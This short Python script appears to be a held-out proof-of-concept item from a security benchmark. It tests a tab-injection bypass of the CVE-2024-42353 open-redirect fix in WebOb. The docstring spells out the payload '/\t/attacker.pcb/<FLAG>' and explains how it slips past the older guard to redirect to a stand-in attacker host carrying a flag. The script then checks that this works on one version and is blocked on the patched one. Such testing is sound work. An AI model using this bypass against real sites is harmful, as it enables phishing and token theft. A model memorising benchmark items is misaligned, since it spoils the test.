"""
HELD-OUT bypass PoC for CVE-2026-44889 (residual open redirect after the
CVE-2024-42353 patch).

Payload: a TAB-injected redirect target  /\t/attacker.pcb/<FLAG>.
- On V1 (WebOb 1.8.8): the CVE-2024-42353 fix only rewrites values that
  literally startswith("//"). "/\t/attacker..." does NOT, so it slips past the
  guard. urljoin() -> urlsplit() (Python 3.10+) then STRIPS the tab, re-forming
  "//attacker..." -> Location: http://attacker.pcb/<FLAG>  (OPEN redirect).
- On V2 (WebOb 1.8.10): the follow-up fix strips \t\r\n FIRST, so the value
  becomes "//attacker..." before the // check -> "/%2f..." -> BLOCKED.

Run: PCB_FLAG=... V1_URL=... V2_URL=... python _heldout/bypass_poc.py
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oracle import probe

flag = os.environ.get("PCB_FLAG", "PCBFLAG_LOCAL_TEST")
v1 = os.environ.get("V1_URL", "http://127.0.0.1:45211")
v2 = os.environ.get("V2_URL", "http://127.0.0.1:45212")

r1 = probe(v1, flag, "residual")
r2 = probe(v2, flag, "residual")
print("residual@V1:", r1)
print("residual@V2:", r2)

ok = r1["reaches_attacker"] and not r2["reaches_attacker"]
print("BYPASS PoC (reaches V1, blocked V2):", "PASS" if ok else "FAIL")
sys.exit(0 if ok else 1)
